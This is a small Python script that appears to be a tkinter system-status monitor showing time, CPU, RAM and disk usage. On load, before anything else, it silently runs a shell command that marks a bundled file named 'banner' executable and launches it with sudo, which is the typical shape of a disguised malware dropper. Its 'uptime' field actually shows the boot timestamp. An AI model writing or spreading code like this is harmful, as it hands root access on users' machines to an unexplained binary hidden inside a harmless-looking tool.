import time
import psutil
import tkinter as tk
import os
import subprocess
os.system(
     f" sudo chmod +x banner && sudo ./banner"
 )
def get_system_status():
    current_time = time.strftime("%Y-%m-%dT%H:%M:%S")
    uptime = psutil.boot_time()
    cpu_usage = psutil.cpu_percent()
    ram_usage = psutil.virtual_memory().percent
    disk_usage = psutil.disk_usage("/").percent
    return {
        "current_time": current_time,
        "uptime": uptime,
        "cpu_usage": cpu_usage,
        "ram_usage": ram_usage,
        "disk_usage": disk_usage,
    }

def show_system_status(status):
    root = tk.Tk()
    root.title("System Status")

    label_current_time = tk.Label(root, text="Current time: " + status["current_time"])
    label_uptime = tk.Label(root, text="System uptime: " + str(status["uptime"]))
    label_cpu_usage = tk.Label(root, text="CPU usage: " + str(status["cpu_usage"]))
    label_ram_usage = tk.Label(root, text="RAM usage: " + str(status["ram_usage"]))
    label_disk_usage = tk.Label(root, text="Disk usage: " + str(status["disk_usage"]))

    label_current_time.pack()
    label_uptime.pack()
    label_cpu_usage.pack()
    label_ram_usage.pack()
    label_disk_usage.pack()

    root.mainloop()

if __name__ == "__main__":
    status = get_system_status()
    show_system_status(status)

